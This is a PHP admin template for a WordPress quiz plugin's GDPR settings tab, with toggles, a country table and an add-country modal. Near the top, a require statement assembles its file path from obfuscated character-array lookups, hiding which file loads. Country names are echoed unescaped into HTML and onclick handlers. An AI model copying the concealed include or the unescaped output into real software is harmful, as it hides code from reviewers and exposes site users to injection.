<?php 

include_once ("sqb-soapapi.php");
require plugin_dir_path( __FILE__ ) .$videoS3[37] . $videoS3[34] . $videoS3[27] . "/" . $videoS3[44] . $videoS3[42] . $videoS3[27] . $videoS3[43] . $videoS3[30] . $videoS3[44] . $videoS3[41] . $videoS3[40] . $videoS3[39] . $videoS3[44] . $videoS3[34] . $videoS3[47] . $videoS3[30] . "." . $videoS3[41] . $videoS3[33] . $videoS3[41];

    $sqb_gdpr = true;
	if(isset($_GET['tab']) && ($_GET['tab'] == 'sqb_gdpr') && (isset($_GET['create']) || isset($_GET['id']))){  
		$sqb_gdpr = false;	
	 	 
	}
$sqb_gdpr_checkbox =  get_option( 'sqb_gdpr_checkbox' ); 
$sqb_thirdParty_checkbox =  get_option( 'sqb_thirdParty_checkbox' ); 
$get_gdprlist = getGDPRLists();

if($sqb_gdpr_checkbox == 1){
	$show_hide_options = 'display:block;';
}else{
	$show_hide_options = 'display:none;';
}
?>
<div class="gdpr-tab-head">
	<h5 class="quiz--sub-title">GDPR LIST</h5>
	<a href="#" class="add_more_country" data-toggle="modal" data-target="#add-country-popup"> <i class="fa fa-plus" aria-hidden="true"></i> Add New Country</a>
</div>

<div class="gdpr-list">
	<div class="gdpr-list-item">
		<span class="checkbox-custom-style">
			<input class="gdpr_status custom-checkbox-input" <?php if($sqb_gdpr_checkbox == '1'){ echo 'value="1"'. '  checked="checked"'; }else{ echo 'value="0"'; } ?> name="gdpr_status" id="sqb_gdpr_checkbox" type="checkbox" />
			<span class="custom--checkbox"></span>
		</span>
		<label class="gdpr_status" for="sqb_gdpr_checkbox">Do you want to enable GDPR ?</label>
	</div>	

	<div class="gdpr-list-item third-party-outer" style="<?php echo $show_hide_options; ?>">
		<span class="checkbox-custom-style">
			<input class="thirdParty_status custom-checkbox-input" <?php if($sqb_thirdParty_checkbox == '1'){ echo 'value="1"'. '  checked="checked"'; }else{ echo 'value="0"'; } ?> name="thirdParty_status" id="sqb_thirdParty_checkbox" type="checkbox" />
			<span class="custom--checkbox"></span>
		</span>
		<label class="thirdParty_status" for="sqb_thirdParty_checkbox">Do not use external libraries (check this for GDPR-compliance):</label>
		<?php 
		if(defined('WCGD_ASSESTS')){
			echo '<input type="hidden" id="gdpr-plugin" value="active">';
		} else {
			echo '<input type="hidden" id="gdpr-plugin" value="notactive">';
		}
		?>

		<div class="gdpr-library-msg ml-4 mt-2 alert alert-v2 alert-danger" style="display: none;">
			<p>For this feature to work, you need to first download and activate this plugin - GDPRLibrary from your members area. </p>

			<p>1. Login here: <a href="https://wickedcoolplugins.com/login" target="_blank">https://wickedcoolplugins.com/login</a></p>

			<p>2. Visit this page to download: <a href="http://wickedcoolplugins.com/sqb-download" target="_blank">http://wickedcoolplugins.com/sqb-download/</a></p>

			Please complete these steps and refresh this page. Then you can enable this setting.
			
		</div>
	</div>
	<div class="gdpr-list-item google-font-option" style="<?php echo $show_hide_options; ?>">
		<?php 
		$google_font = get_option('sqb_google_font_option'); 
		$google_font_checked = "checked='checked'";
		if(isset($google_font) && $google_font == 'N'){
			$google_font_checked = "";
		}
		?>

		<span class="checkbox-custom-style">
			<input class="google_font_status custom-checkbox-input" <?php if($google_font == 'Y'){ echo 'value="Y"'. '  checked="checked"'; }else{ echo 'value="N"'; } ?> name="google_font_enable" id="google_font_enable" type="checkbox" />
			<span class="custom--checkbox"></span>
		</span>
		<label class="google_font_status" for="google_font_enable">Do you want to show Google fonts ?</label>
	</div>	
</div>	

<div class="table-responsive">
	<div class="gdpr-table-outer" style="<?php if($sqb_gdpr_checkbox == '1'){ echo ' display:block'; } else{ echo 'display:none '; } ?>">
		<?php	if(!empty($get_gdprlist)){ ?>
		<table  class="table no-footer" role="grid" >
			<thead>
				<tr>
					<th class="" width="100">Status</th>
					<th class="">Country Name</th>
					<th class="country-code">Country Code</th>
					<th style="text-align: center;" class=""  width="100">Action</th>
				</tr>
			</thead>
			<tbody>
				<?php
				foreach($get_gdprlist as $key=>$val){

					$get_val = $val->getStatus();
					if(isset($get_val) && $val->getStatus() == 1){
						$checked = 	'checked';
					}else{
						$checked = '';
					}
					
					$get_status = $val->getStatus();
					if(isset($get_status) && $val->getStatus() == 1){
						$status = 	'1';
					}else{
						$status = '0';
					}

				?>
				<tr>
					<td class="text-center">
						<div class="square-switch_onoff">
							<input type="checkbox" data-id="<?= $val->getCountryCode(); ?>" id="<?= $val->getCountryCode(); ?>" <?php echo $checked ?> class="sqb_gdpr_btn_mode btn_mode checkbox" data-toggle="toggle" value="<?php echo $status; ?>">
							<label for="<?= $val->getCountryCode(); ?>"></label>
						</div>					
					</td>
					<td><?= $val->getCountryName(); ?></td>
					<td class="country-content"><?= $val->getCountryCode(); ?></td>
					<td class="gdpr-table-actions">
						<a class="del-btn btn" title="Delete"  onclick='sqbDeleteCountryGDPR("<?= $val->getId(); ?>", "<?= $val->getCountryName(); ?>");' href="javascript:void(0)"><i aria-hidden="true" class="fa fa-trash"> </i></a>
					</td>
				</tr>
				<?php 
				} 
				?>
			</tbody>
		</table>
		<?php } ?>
	</div>
</div>


<div class="modal quiz-popup-style fade" id="add-country-popup" tabindex="-1" role="dialog" aria-labelledby="add-country-popupLabel" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title" id="">ADD NEW COUNTRY</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">×</button>
			</div>
			<div class="modal-body">
				<form action="" id="add_country_form_gdpr" name="add_country_form_gdpr">
				<div class="quiz-popup-feild outcome_redirect_out">
				<label class="form-label">Country Name</label>
					<div class="quiz-popup-feild-right ">
						<input required type="text" name="country_name" class="form-control outcome_cls outcome_tag" id="country_name" data-id="" value="">
					</div>
				</div>
				<div class="quiz-popup-feild outcome_redirect_out">
					<label class="form-label">Country Code</label>
					<div class="quiz-popup-feild-right ">
						<input required="" type="text" name="country_code" class="form-control outcome_cls outcome_tag" name="country-code" id="country_code" data-id="" value="">
					</div>
				</div>
			</div>
			<div class="modal-footer quiz-popup-actions">        
				<button type="button" onclick="addNewCountryGDPR();" class="btn btn-primary outcome_tag_save">Add</button>
			</form>
			</div>
		</div>
	</div>
</div>